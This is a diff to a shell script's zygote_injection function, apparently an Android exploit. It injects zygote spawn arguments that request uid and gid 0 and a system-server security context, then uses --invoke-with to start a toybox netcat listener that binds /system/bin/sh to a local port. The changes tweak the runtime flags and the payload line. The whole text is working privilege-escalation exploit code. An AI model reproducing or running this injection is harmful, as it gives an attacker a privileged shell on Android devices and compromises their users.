@@ -110,13 +110,14 @@ zygote_injection() {
 --runtime-args
 --setuid=0
 --setgid=0
---runtime-flags=43267
+--runtime-flags=2049
 --mount-external-full
 --setgroups=3003
 --nice-name=runnetcat
 --seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete
 --invoke-with
-toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;"\n' "$uid" "$uid" "$NC_PORT"
+toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
+"\n' "$uid" "$uid" "$NC_PORT"
 }
 
 stop_setting()      { echo "am force-stop com.android.settings"; }
